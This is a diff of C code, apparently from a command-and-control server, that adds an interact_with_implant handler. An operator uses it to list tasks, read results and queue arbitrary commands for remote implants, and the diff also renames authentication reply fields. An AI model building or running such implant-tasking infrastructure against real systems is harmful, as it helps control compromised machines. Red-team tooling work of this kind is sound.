@@ -49,9 +49,10 @@ int autheticate(int sock) {
         cJSON_Delete(creds);
         // Handle error or exit
         return -1;
-    }  
+    }
+
     if (authenticate_operator(username->valuestring, password->valuestring) != 0) {
-        cJSON_AddStringToObject(reply, "operator", "false");
+        cJSON_AddStringToObject(reply, "authenticated", "false");
         char *reply_ = cJSON_Print(reply);
         send(sock, reply_, strlen(reply_), 0);
         free(reply_);
@@ -60,7 +61,7 @@ int autheticate(int sock) {
         return -1;
         
     }
-    cJSON_AddStringToObject(reply, "operator", "true");
+    cJSON_AddStringToObject(reply, "authenticated", "true");
     char *reply_ = cJSON_Print(reply);
     send(sock, reply_, strlen(reply_), 0);
     free(reply_);
@@ -68,6 +69,59 @@ int autheticate(int sock) {
 
     cJSON_Delete(creds);
     return 0;
+}
+
+
+char *interact_with_implant(cJSON *rinfo) {
+    if (!rinfo) {
+        return strdup("{\"error\": \"Invalid JSON\"}");
+    }
+
+    cJSON *implant_id = cJSON_GetObjectItem(rinfo, "implant_id");
+    cJSON *action = cJSON_GetObjectItem(rinfo, "action");
+
+    if (!action || !cJSON_IsString(action) || !implant_id || !cJSON_IsString(implant_id)) {
+        return strdup("{\"error\": \"Missing or invalid action/implant_id\"}");
+    }
+
+    const char *action_value = action->valuestring;
+    const char *implant_id_value = implant_id->valuestring;
+
+    char *data = malloc(BUFFER_SIZE);
+    if (!data) return strdup("{\"error\": \"Memory allocation failed\"}");
+
+    if (strcmp(action_value, "list-tasks") == 0) {
+        snprintf(data, BUFFER_SIZE, "%s", tasks_per_agent(implant_id_value));
+    } 
+    else if (strcmp(action_value, "response-task") == 0) {
+        cJSON *task = cJSON_GetObjectItem(rinfo, "task_id");
+        if (!task || !cJSON_IsNumber(task)) {
+            free(data);
+            return strdup("{\"error\": \"Invalid task_id\"}");
+        }
+        char *data_t = cmd_and_response(task->valueint);
+        snprintf(data, BUFFER_SIZE, "%s", data_t);
+        free(data_t);
+    } 
+    else if (strcmp(action_value, "new-task") == 0) {
+        cJSON *command = cJSON_GetObjectItem(rinfo, "command");
+        if (!command || !cJSON_IsString(command)) {
+            free(data);
+            return strdup("{\"error\": \"Invalid command\"}");
+        }
+        new_tasks(implant_id_value, command->valuestring);
+        free(data);
+        cJSON *tasks_added = cJSON_CreateObject();
+        cJSON_AddStringToObject(tasks_added, "status", "task_added");
+        data = cJSON_Print(tasks_added);
+        cJSON_Delete(tasks_added);
+    } 
+    else {
+        free(data);
+        return strdup("{\"error\": \"Invalid action\"}");
+    }
+
+    return data;
 }
 
 
@@ -93,47 +147,43 @@ void *operator_handler(void *new_sock) {
             perror("recv failed");
             return NULL;
         }
+
         buffer[bytes_received] = '\0'; 
         cJSON *requested_info = cJSON_Parse(buffer);
         if (requested_info == NULL) {
             fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
             return NULL;
         }
+
         cJSON *about = cJSON_GetObjectItem(requested_info, "Info");
         if (about == NULL || !cJSON_IsString(about)) {
             fprintf(stderr, "Missing or invalid 'Info' field in JSON\n");
             cJSON_Delete(requested_info);
             return NULL;
         }
-        if (strcmp(about->valuestring, "Implants") == 0){
-            char *agents = info_view("Implants");
+
+        if (strcmp(about->valuestring, "Implants") == 0){ // all info about implants
+            char *agents = GetData("Implants");
             send(sock, agents, strlen(agents), 0);
             free(agents);
         } else if (strcmp(about->valuestring, "Tasks") == 0) {
-            char *tasks = info_view("Tasks");
+            char *tasks = GetData("Tasks");
             send(sock, tasks, strlen(tasks), 0);
             free(tasks);
         } else if (strcmp(about->valuestring, "Logs") == 0) {
-            char *logs = info_view("Logs");
+            char *logs = GetData("Logs");
             send(sock, logs, strlen(logs), 0);
             free(logs);
-        } else if (strcmp(about->valuestring, "agent_id") == 0) {
-            cJSON *agent_id = cJSON_GetObjectItem(requested_info, "agent_id");
-            char *t = tasks_per_agent(agent_id->valuestring);
-            send(sock, t, strlen(t), 0);
-            free(t);
-        } else if (strcmp(about->valuestring, "new_task") ==0 ) {
-            cJSON *agent_id = cJSON_GetObjectItem(requested_info, "agent_id");
-            cJSON *command = cJSON_GetObjectItem(requested_info, "command");
-            new_tasks(agent_id->valuestring, command->valuestring);
-
-            cJSON *tasks_added = cJSON_CreateObject();
-            cJSON_AddStringToObject(tasks_added, "Tasks", "Added");
-            char *data = cJSON_Print(tasks_added);
+        } else if (strcmp(about->valuestring, "implant_id") == 0) {
+            printf("IMPLANT ID \n");
+            char *data = interact_with_implant(requested_info);
+            if (data == NULL) {
+                send(sock, "ERROR", strlen("ERROR"), 0);
+                continue;
+            }
+            printf("DATA SENT\n");
             send(sock, data, strlen(data), 0);
             free(data);
-            cJSON_Delete(tasks_added);
-
         }
         cJSON_Delete(requested_info);
     }
